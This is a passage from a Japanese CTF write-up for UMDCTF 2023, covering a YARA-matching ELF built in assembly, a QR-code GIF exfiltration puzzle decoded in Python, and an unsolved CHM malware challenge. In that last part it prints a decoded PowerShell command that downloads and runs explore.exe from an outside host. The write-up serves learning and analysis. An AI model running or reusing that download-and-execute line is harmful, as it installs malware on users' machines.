+<span class="nl">msg:</span>    <span class="na">.ascii</span>  <span class="s">&#34;jessie&#34;</span>
+<span class="nl">msg2:</span>   <span class="na">.ascii</span>  <span class="s">&#34;james&#34;</span>
+<span class="nl">msg3:</span>   <span class="na">.ascii</span>  <span class="s">&#34;meowth&#34;</span>
+<span class="nl">msg4:</span>   <span class="na">.ascii</span>  <span class="s">&#34;im so tired&#34;</span>
+<span class="nl">msg5:</span>   <span class="na">.ascii</span>  <span class="s">&#34;sleepy time&#34;</span>
+<span class="nl">msg6:</span>   <span class="na">.ascii</span>  <span class="s">&#34;bruhsinglebytexorin2023?&#34;</span>
+<span class="nl">msgend:</span> <span class="na">.equ</span>    <span class="no">len</span><span class="p">,</span> <span class="no">msgend</span> <span class="p">-</span> <span class="no">msg</span>
+
+<span class="na">.text</span>
+<span class="na">.globl</span> <span class="no">_start</span>
+<span class="nl">_start:</span>
+      <span class="c"># call system-call &#39;write&#39;
+</span><span class="c"></span>      <span class="nf">movl</span>    <span class="no">$0x4</span><span class="p">,</span> <span class="nv">%eax</span>      <span class="c"># sys-call number.
+</span><span class="c"></span>      <span class="no">movl</span>    <span class="no">$1</span><span class="p">,</span> <span class="nv">%ebx</span>        <span class="c"># file descriptor.
+</span><span class="c"></span>      <span class="no">movl</span>    <span class="no">$msg</span><span class="p">,</span> <span class="nv">%ecx</span>      <span class="c"># data.
+</span><span class="c"></span>      <span class="no">movl</span>    <span class="no">$len</span><span class="p">,</span> <span class="nv">%edx</span>      <span class="c"># data size.
+</span><span class="c"></span>      <span class="no">int</span>     <span class="no">$0x80</span>
+      <span class="c"># call system-call &#39;exit&#39;
+</span><span class="c"></span>      <span class="nf">movl</span>    <span class="no">$0x1</span><span class="p">,</span> <span class="nv">%eax</span>      <span class="c"># sys-call number.
+</span><span class="c"></span>      <span class="no">movl</span>    <span class="no">$0</span><span class="p">,</span> <span class="nv">%ebx</span>        <span class="c"># exit code.
+</span><span class="c"></span>      <span class="no">int</span>     <span class="no">$0x80</span>
+	
+<span class="hl"><span class="na">.section</span> <span class="no">.bindata</span>
+</span><span class="hl"><span class="na">.incbin</span> <span class="s">&#34;./snow_slide.mp4&#34;</span>
+</span><span class="na">.section</span> <span class="no">poophaha</span>
+<span class="na">.section</span> <span class="no">poophaha0</span>
+<span class="na">.section</span> <span class="no">poophaha1</span>
+<span class="na">.section</span> <span class="no">poophaha2</span>
+<span class="na">.section</span> <span class="no">poophaha3</span>
+<span class="na">.section</span> <span class="no">poophaha4</span>
+<span class="na">.section</span> <span class="no">poophaha5</span>
+<span class="na">.section</span> <span class="no">poophaha6</span>
+<span class="na">.section</span> <span class="no">poophaha7</span>
+<span class="na">.section</span> <span class="no">poophaha8</span>
+<span class="na">.section</span> <span class="no">poophaha9</span>
+<span class="na">.section</span> <span class="no">poophaha10</span>
+<span class="na">.section</span> <span class="no">poophaha11</span>
+<span class="na">.section</span> <span class="no">poophaha12</span>
+<span class="na">.section</span> <span class="no">poophaha13</span>
+<span class="na">.section</span> <span class="no">poophaha14</span>
+<span class="na">.section</span> <span class="no">poophaha15</span>
+<span class="na">.section</span> <span class="no">poophaha16</span>
+<span class="na">.section</span> <span class="no">poophaha17</span>
+<span class="na">.section</span> <span class="no">poophaha18</span>
+<span class="na">.section</span> <span class="no">poophaha19</span>
+<span class="na">.section</span> <span class="no">poophaha20</span>
+<span class="na">.section</span> <span class="no">poophaha21</span>
+<span class="na">.section</span> <span class="no">poophaha22</span>
+<span class="na">.section</span> <span class="no">poophaha23</span>
+<span class="na">.section</span> <span class="no">poophaha24</span>
+<span class="na">.section</span> <span class="no">poophaha25</span>
+<span class="na">.section</span> <span class="no">poophaha26</span>
+<span class="na">.section</span> <span class="no">poophaha27</span>
+<span class="na">.section</span> <span class="no">poophaha28</span>
+<span class="na">.section</span> <span class="no">poophaha29</span>
+<span class="na">.section</span> <span class="no">poophaha30</span>
+<span class="na">.section</span> <span class="no">poophaha31</span>
+<span class="na">.section</span> <span class="no">poophaha32</span>
+<span class="na">.section</span> <span class="no">poophaha33</span>
+<span class="na">.end</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br ></p>
+<p>文字列に関しては、.data sectionの辺りに書くだけなので、難しくはないです。</p>
+<p><br /></p>
+<p>24, 25行目では、手元にあったテキトーなmp3をインクルードしています。</p>
+<p>これで、エントロピーの調整(rule5)と、ファイルサイズの調整(rule8)をしています。</p>
+<p>圧縮ファイルでエントロピーがあがるので、.mp4じゃなくても.jpgとかでもいけたはずです。</p>
+<p><br /></p>
+<p>あとは、section名を指定しているところと、section数を増やしているところですね。</p>
+<p><br /></p>
+<p>Script fileについては、まず、<code>ld --verbose</code>コマンドでデフォルトで使われているscript fileを取り出し、それを編集して使いました。</p>
+<p>以下は編集後のファイルの抜粋。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="hl"><span class="lnt">14
+</span></span><span class="hl"><span class="lnt">15
+</span></span><span class="hl"><span class="lnt">16
+</span></span><span class="hl"><span class="lnt">17
+</span></span><span class="hl"><span class="lnt">18
+</span></span><span class="hl"><span class="lnt">19
+</span></span><span class="hl"><span class="lnt">20
+</span></span><span class="hl"><span class="lnt">21
+</span></span><span class="hl"><span class="lnt">22
+</span></span><span class="hl"><span class="lnt">23
+</span></span><span class="hl"><span class="lnt">24
+</span></span><span class="hl"><span class="lnt">25
+</span></span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="hl"><span class="lnt">29
+</span></span><span class="hl"><span class="lnt">30
+</span></span><span class="hl"><span class="lnt">31
+</span></span><span class="hl"><span class="lnt">32
+</span></span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">/*</span> <span class="nf">Script</span> <span class="no">for</span> <span class="p">-</span><span class="no">z</span> <span class="no">combreloc</span> <span class="p">-</span><span class="no">z</span> <span class="no">separate-code</span> <span class="p">*</span><span class="err">/</span>
+<span class="err">/*</span> <span class="nf">Copyright</span> <span class="p">(</span><span class="no">C</span><span class="p">)</span> <span class="mi">2014</span><span class="p">-</span><span class="mi">2022</span> <span class="no">Free</span> <span class="no">Software</span> <span class="no">Foundation</span><span class="p">,</span> <span class="no">Inc.</span>
+   <span class="nf">Copying</span> <span class="no">and</span> <span class="no">distribution</span> <span class="no">of</span> <span class="no">this</span> <span class="no">script</span><span class="p">,</span> <span class="no">with</span> <span class="no">or</span> <span class="no">without</span> <span class="no">modification</span><span class="p">,</span>
+   <span class="nf">are</span> <span class="no">permitted</span> <span class="no">in</span> <span class="no">any</span> <span class="no">medium</span> <span class="no">without</span> <span class="no">royalty</span> <span class="no">provided</span> <span class="no">the</span> <span class="no">copyright</span>
+   <span class="nf">notice</span> <span class="no">and</span> <span class="no">this</span> <span class="no">notice</span> <span class="no">are</span> <span class="no">preserved.</span>  <span class="p">*</span><span class="err">/</span>
+<span class="nf">OUTPUT_FORMAT</span><span class="p">(</span><span class="err">&#34;</span><span class="no">elf64-x86-64</span><span class="err">&#34;</span><span class="p">,</span> <span class="err">&#34;</span><span class="no">elf64-x86-64</span><span class="err">&#34;</span><span class="p">,</span>
+	      <span class="err">&#34;</span><span class="nf">elf64-x86-64</span><span class="err">&#34;</span><span class="p">)</span>
+<span class="nf">OUTPUT_ARCH</span><span class="p">(</span><span class="no">i386</span><span class="p">:</span><span class="no">x86-64</span><span class="p">)</span>
+<span class="nf">ENTRY</span><span class="p">(</span><span class="no">_start</span><span class="p">)</span>
+<span class="nf">SEARCH_DIR</span><span class="p">(</span><span class="err">&#34;=/</span><span class="no">usr</span><span class="err">/</span><span class="no">local</span><span class="err">/</span><span class="no">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">&#34;</span><span class="p">)</span><span class="c">; SEARCH_DIR(&#34;=/lib/x86_64-linux-gnu&#34;); SEARCH_DIR(&#34;=/usr/lib/x86_64-linux-gnu&#34;); SEARCH_DIR(&#34;=/usr/lib/x86_64-linux-gnu64&#34;); SEARCH_DIR(&#34;=/usr/local/lib64&#34;); SEARCH_DIR(&#34;=/lib64&#34;); SEARCH_DIR(&#34;=/usr/lib64&#34;); SEARCH_DIR(&#34;=/usr/local/lib&#34;); SEARCH_DIR(&#34;=/lib&#34;); SEARCH_DIR(&#34;=/usr/lib&#34;); SEARCH_DIR(&#34;=/usr/x86_64-linux-gnu/lib64&#34;); SEARCH_DIR(&#34;=/usr/x86_64-linux-gnu/lib&#34;);
+</span><span class="c"></span><span class="no">SECTIONS</span>
+<span class="err">{</span>
+  <span class="nf">PROVIDE</span> <span class="p">(</span><span class="no">__executable_start</span> <span class="err">=</span> <span class="no">SEGMENT_START</span><span class="p">(</span><span class="err">&#34;</span><span class="no">text-segment</span><span class="err">&#34;</span><span class="p">,</span> <span class="mi">0x400000</span><span class="p">))</span><span class="c">; . = SEGMENT_START(&#34;text-segment&#34;, 0x400000) + SIZEOF_HEADERS;
+</span><span class="hl"><span class="c"></span>  <span class="no">.bindata</span>           <span class="p">:</span>
+</span><span class="hl">  <span class="err">{</span>
+</span><span class="hl">    <span class="nf">KEEP</span> <span class="p">(*(.</span><span class="no">bindata</span><span class="p">))</span>
+</span><span class="hl">  <span class="err">}</span>
+</span><span class="hl">  <span class="nf">poophaha</span>           <span class="p">:</span>
+</span><span class="hl">  <span class="err">{</span>
+</span><span class="hl">    <span class="nf">KEEP</span> <span class="p">(*(</span><span class="no">poophaha</span><span class="p">))</span>
+</span><span class="hl">  <span class="err">}</span>
+</span><span class="hl">  <span class="nf">poophaha1</span>           <span class="p">:</span>
+</span><span class="hl">  <span class="err">{</span>
+</span><span class="hl">    <span class="nf">KEEP</span> <span class="p">(*(</span><span class="no">poophaha1</span><span class="p">))</span>
+</span><span class="hl">  <span class="err">}</span>
+</span><span class="err">:</span>
+<span class="err">(</span><span class="nf">snip</span><span class="p">)</span>
+<span class="err">:</span>
+<span class="hl">  <span class="nf">poophaha33</span>           <span class="p">:</span>
+</span><span class="hl">  <span class="err">{</span>
+</span><span class="hl">    <span class="nf">KEEP</span> <span class="p">(*(</span><span class="no">poophaha33</span><span class="p">))</span>
+</span><span class="hl">  <span class="err">}</span>
+</span>  <span class="na">.interp</span>         <span class="p">:</span> <span class="err">{</span> <span class="p">*(.</span><span class="no">interp</span><span class="p">)</span> <span class="err">}</span>
+<span class="err">:</span>
+<span class="err">(</span><span class="nf">snip</span><span class="p">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p><br /></p>
+<p>以下がELFファイルの作成方法です。これはMakefileにしておいて使いました。</p>
+<pre>
+$ as -o hello_world.o hello_world.asm
+$ ld -o hello_world.out -T linker_script.ld hello_world.o
+</pre>
+<p><br /></p>
+<p>Sectionがちゃんとできているかどうかは、<code>readelf</code>コマンドで確認できます。</p>
+<pre>
+$ readelf -t hello_world.out
+</pre>
+<p><br /></p>
+<p>ローカルでのテスト結果：</p>
+<pre>
+$ yara yara_rules.yar hello_world.out
+rule1 hello_world.out
+rule2 hello_world.out
+rule3 hello_world.out
+rule4 hello_world.out
+rule5 hello_world.out
+rule6 hello_world.out
+rule7 hello_world.out
+rule8 hello_world.out
+</pre>
+<p><br /></p>
+<p>このファイルを、ウェブサイトにアップロードしたら、フラグが得られました。</p>
+<p><br /></p>
+<p>Flag: <code>UMDCTF{Y0ur3_4_r34l_y4r4_m4573r!}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-telekinetic-warfare-442-points">[Forensics]: Telekinetic Warfare (442 points)</h2>
+<hr>
+<h3 id="challenge-3">Challenge</h3>
+<blockquote>
+<p>Someone was able to exfil a top secret document from our airgapped network! How???</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>bruh.gif</li>
+</ul>
+<p><br /></p>
+<h3 id="solution-3">Solution</h3>
+<p>QRコードが含まれるアニメーションGIFです。</p>
+<p>試しに最初のQRコードを読み取ってみると、Base64でエンコードした文字列が得られました。</p>
+<p>10000以上のQRコードが含まれていますが、それらを読み取って一つにまとめてファイルに落とすだけなので、やることは明確です。</p>
+<p><br /></p>
+<p>このチャレンジは、Mac PC上で解きました。</p>
+<p>下準備。</p>
+<pre>
+$ pip install pyzbar
+$ brew install zbar
+$ pip install Pillow
+</pre>
+<p><br /></p>
+<p>書いたコード：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-Python" data-lang="Python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="c1">#-*- coding:utf-8 -*-</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">from</span> <span class="nn">PIL</span> <span class="kn">import</span> <span class="n">Image</span><span class="p">,</span> <span class="n">ImageSequence</span>
+<span class="kn">from</span> <span class="nn">pyzbar.pyzbar</span> <span class="kn">import</span> <span class="n">decode</span>
+
+<span class="n">IMAGE_PATH</span> <span class="o">=</span> <span class="s1">&#39;bruh.gif&#39;</span>
+
+<span class="k">def</span> <span class="nf">get_frames</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="n">im</span> <span class="o">=</span> <span class="n">Image</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span><span class="n">frame</span><span class="o">.</span><span class="n">copy</span><span class="p">()</span> <span class="k">for</span> <span class="n">frame</span> <span class="ow">in</span> <span class="n">ImageSequence</span><span class="o">.</span><span class="n">Iterator</span><span class="p">(</span><span class="n">im</span><span class="p">))</span>
+
+<span class="n">outfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;brush.pdf&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span>
+<span class="n">frames</span> <span class="o">=</span> <span class="n">get_frames</span><span class="p">(</span><span class="n">IMAGE_PATH</span><span class="p">)</span>
+<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">f</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">frames</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">decode</span><span class="p">(</span><span class="n">f</span><span class="p">):</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">x</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+        <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
+        <span class="c1"># print(base64.b64decode(data))</span>
+<span class="n">outfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><br /></p>
+<p>Flag: <code>UMDCTF{wh0_n33d5_k1net1c_w4rfar3_anyw4ys}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-malware-chall-disclaimer-0-point">[Forensics]: Malware Chall Disclaimer (0 point)</h2>
+<hr>
+<h3 id="challenge-4">Challenge</h3>
+<blockquote>
+<p>The challenge &ldquo;Doctors Hate Him&rdquo; is designed to emulate an actual piece of malware so handle the file with caution. The sample was written by us however it should still be treated as malicious.
+<br /><br />
+Flag: UMDCTF{i_understand_that_malware_chall_is_sus}</p>
+</blockquote>
+<p><br /></p>
+<h3 id="solution-4">Solution</h3>
+<p>&ldquo;Doctors Hate Him&rdquo; のチャレンジは、実際のマルウェアの一部を模倣して作成したものなので、注意を払って扱ってください、みたいなことだそうです。</p>
+<p><br /></p>
+<p>Flag: <code>UMDCTF{i_understand_that_malware_chall_is_sus}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="forensics-doctors-hate-him-482-points">[Forensics]: Doctors hate him!! (482 points)</h2>
+<hr>
+<h3 id="challenge-5">Challenge</h3>
+<blockquote>
+<p>Someone sent me this in an email&hellip; ad targeting is hitting a little too close here smh&hellip;</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>Doctors-Hate-Him.zip</li>
+</ul>
+<p><br /></p>
+<h3 id="unsolved">(Unsolved)</h3>
+<p>イベント中に解けなかったチャレンジですが、途中まではできたので、記録に残しておきます。</p>
+<p>Zipファイルには、.chmファイルが入っています。</p>
+<p><br /></p>
+<p>実はたまたま最近、.chmファイルタイプのマルウェアを調べる機会があったんですよね。</p>
+<p>参考にしたUnit42のブログ：</p>
+<p><a href="https://unit42.paloaltonetworks.com/malicious-compiled-html-help-file-agent-tesla/">https://unit42.paloaltonetworks.com/malicious-compiled-html-help-file-agent-tesla/</a></p>
+<p><br /></p>
+<p>.chmファイルは、<code>7z x</code>で解凍が可能です。</p>
+<p><br /></p>
+<p>解凍して出てくる test.html の中に、Base64でエンコードされている文字列があります。デコードすると、以下になります。</p>
+<p><code>I.n.v.o.k.e.-.W.e.b.R.e.q.u.e.s.t. .-.U.r.i. .h.t.t.p.:././.d.n.s.-.s.e.r.v.e.r...o.n.l.i.n.e.:.6.9.6.9./.e.x.p.l.o.r.e...e.x.e. .-.O.u.t.F.i.l.e. .e.x.p.l.o.r.e...e.x.e.;. .S.t.a.r.t.-.P.r.o.c.e.s.s. .e.x.p.l.o.r.e...e.x.e.;. .=.'.g.u.r.l._.j.n.a.g._.g.u.r.v.e.'.</code></p>
+<p><br /></p>
+<p>余計な <code>.</code> を取り除いて見やすくすると、以下になります。フラグの一部っぽい文字列 <code>gurl_jnag_gurve</code> も見つかります。</p>
+<pre>
+Invoke-WebRequest -Uri http://dns-server.online:6969/explore.exe -OutFile explore.exe; Start-Process explore.exe; ='gurl_jnag_gurve'.
+</pre>
+<p><br /></p>
+<p>また、test.html には、コメントが含まれていて、フラグの一部 <code>UMDCTF{1997_called_</code> が見つかります。</p>
+<p><br /></p>
+<p><code>explore.exe</code>は、実際にダウンロードすることができて、Hash値は <code>63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51</code> です。</p>
+<p><br /></p>
+<p>VirusTotalのScoreでは、多くのセキュリティベンダーがマルウェア判定しています。</p>
+<p><a href="https://www.virustotal.com/gui/file/63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51">https://www.virustotal.com/gui/file/63d961efa8c959a1f890d584daa07beffba0138e296aa08a5d639ef4b5b33d51</a></p>
+<p><br /></p>
+<p>ここでPEファイルが入手できたので、静的解析やら動的解析やらをして、フラグの最後のピースを探そうとした人が多かったんじゃないかと思います。</p>
+<p>わたしもその内の一人で、ここで詰みました。。</p>
+<p>他の方のWriteupを参照すると、http://dns-server.online:6969/ に <code>present.txt</code> というファイルがあり、そこから最後のフラグが取れたようですね。</p>
+<p><br /></p>
+<p>まぁ、そういうチャレンジもありなのかと思いますが、どうせなら<code>present.txt</code>に繋がる情報を<code>explore.exe</code>の中に埋め込んでおいて貰えたらもっと親切だったのに、とは思いました。</p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2023-05-04
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/tamuctf_2023/">
+            <span class="next-text nav-default">TAMUctf 2023 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2023<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
